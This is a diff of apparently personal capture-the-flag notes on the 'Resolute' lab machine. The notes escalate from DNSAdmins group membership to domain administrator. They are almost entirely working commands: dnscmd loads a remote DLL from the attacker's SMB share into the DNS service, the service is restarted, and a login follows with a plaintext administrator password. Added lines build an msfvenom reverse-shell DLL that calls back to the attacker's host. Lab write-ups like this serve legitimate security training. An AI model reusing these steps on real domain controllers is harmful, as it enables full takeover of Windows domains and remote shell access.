@@ -185,7 +185,7 @@ Resolute:
 
 ###########################################PRIVILEGE ADMIN ESCALATION VIA DNS DLL ###############################################################################################
 
-
+Exploit DNS DLL Priv Escalation:
             Check if a user is in DNSAdmins group:
                 net user ryan /domain
 
@@ -220,17 +220,33 @@ Resolute:
                             The command completed successfully.
 
             TO EXECUTE THE DNS SERVICE with the Privilege Admin Escalation Payload:
-                *Evil-WinRM* PS C:\Users\ryan\Documents> cmd /c dnscmd localhost /config /serverlevelplugindll \\10.10.16.28\cool\dnsSecAD.dll
+                *Evil-WinRM* PS C:\Users\ryan\Documents> cmd /c dnscmd 127.0.0.1 /config /serverlevelplugindll \\10.10.16.28\share\dnsSecAD.dll
+
                 OR IF it fails try:
                     dnscmd megabank.local /config /serverlevelplugindll \\10.10.16.28\cool\dnsSecAD.dll
 
-                sc.exe \\resolute stop dns
-
-                sc.exe \\resolute start dns
+                Then:
+                    sc.exe \\resolute stop dns
+                    sc.exe \\resolute start dns
 
 
             We connect with new creds:
                 evil-winrm -i 10.10.10.169 -u administrator  -p Adib1234@!
+
+
+            Other payload with a reverse shell:
+                Kali:
+                    msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.16.28 LPORT=9001 -f dll > dnsSSH.dll
+
+                Windows:
+                    *Evil-WinRM* PS C:\Users\ryan\Desktop> cmd /c dnscmd 127.0.0.1 /config /serverlevelplugindll \\10.10.16.28\share\dnsSSH.dll
+
+                        Registry property serverlevelplugindll successfully reset.
+                        Command completed successfully.
+
+                    *Evil-WinRM* PS C:\Users\ryan\Desktop> sc.exe stop dns
+                    *Evil-WinRM* PS C:\Users\ryan\Desktop> sc.exe start dns
+
 
 
 
